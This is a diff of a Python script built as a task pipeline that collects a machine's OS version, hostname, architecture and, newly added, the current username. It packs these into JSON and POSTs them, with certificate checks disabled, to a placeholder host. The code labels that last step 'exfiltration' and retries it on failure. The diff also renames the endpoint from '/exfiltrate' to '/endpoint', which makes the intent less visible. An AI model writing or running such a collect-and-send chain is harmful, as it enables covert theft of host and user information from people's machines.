@@ -1,23 +1,42 @@
 #!/usr/bin/env python3
-import sys, json, time
+import sys
+import json
+import time
 import platform
+import subprocess
 from typing import Dict, Any
+from pathlib import Path
 import requests
+import os
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Collect system information
+        # Collect OS version
         os_version = platform.version()
+
+        # Collect hostname
         hostname = platform.node()
+
+        # Collect architecture
         architecture = platform.machine()
+
+        # Collect current username
+        username = os.getenv('USERNAME') or os.getenv('USER')
+        if not username:
+            try:
+                import win32api
+                username = win32api.GetUserName()
+            except ImportError:
+                username = None
 
         # Prepare result dictionary
         result = {
-            'os_version': os_version,
-            'hostname': hostname,
-            'architecture': architecture
+            "os_version": os_version,
+            "hostname": hostname,
+            "architecture": architecture,
+            "username": username
         }
 
         return {'success': True, 'data': result,
@@ -30,20 +49,22 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Extract system information from input_data
+        # Collect system information from input_data
         os_version = input_data.get('os_version', '')
         hostname = input_data.get('hostname', '')
         architecture = input_data.get('architecture', '')
+        username = input_data.get('username', '')
 
         # Prepare the payload as a JSON string
-        system_info = {
+        payload_data = {
             'os_version': os_version,
             'hostname': hostname,
-            'architecture': architecture
+            'architecture': architecture,
+            'username': username
         }
-        payload = json.dumps(system_info)
+        payload = json.dumps(payload_data)
 
-        # Prepare the result dictionary
+        # Resulting data dictionary
         result = {
             'payload': payload
         }
@@ -58,17 +79,17 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Parse the input payload
+        # Parse the JSON payload from the input
         payload = json.loads(input_data.get('payload', '{}'))
         
         # Define the remote server URL
-        url = "https://remote-server.example.com/exfiltrate"
+        url = "https://remote-server.example.com/endpoint"
         
-        # Send the data via HTTPS POST
+        # Send the JSON payload via HTTPS POST
         headers = {'Content-Type': 'application/json'}
-        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=15, verify=False)
+        response = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
         
-        # Prepare the result
+        # Prepare the result based on the response
         result = {
             'success': response.status_code == 200,
             'status_code': response.status_code
@@ -76,8 +97,11 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
-    except (requests.ConnectionError, requests.Timeout) as e:
-        return {'success': False, 'error': f'{type(e).__name__}: {e}',
+    except requests.exceptions.ConnectionError as e:
+        return {'success': False, 'error': f'ConnectionError: {e}',
+                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
+    except requests.exceptions.Timeout as e:
+        return {'success': False, 'error': f'Timeout: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
@@ -127,16 +151,16 @@ def main() -> dict:
         results['T2'] = {'success': False, 'error': str(e)}
         return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
     
-    # ── T3: Transmit Data to Remote Server [exfiltration] ──
+    # ── T3: Send Data to Remote Server [exfiltration] ──
     try:
         r = task_T3(outputs.get('T2', {}))
         results['T3'] = r
         if r.get('success'):
             outputs['T3'] = r.get('data', {})
-            print(f'[+] T3 (Transmit Data to Remote Server): OK')
+            print(f'[+] T3 (Send Data to Remote Server): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T3 (Transmit Data to Remote Server): FAILED — {err}')
+            print(f'[-] T3 (Send Data to Remote Server): FAILED — {err}')
             failed.append('T3')
             r2 = task_T3(outputs.get('T2', {}))
             if r2.get('success'):
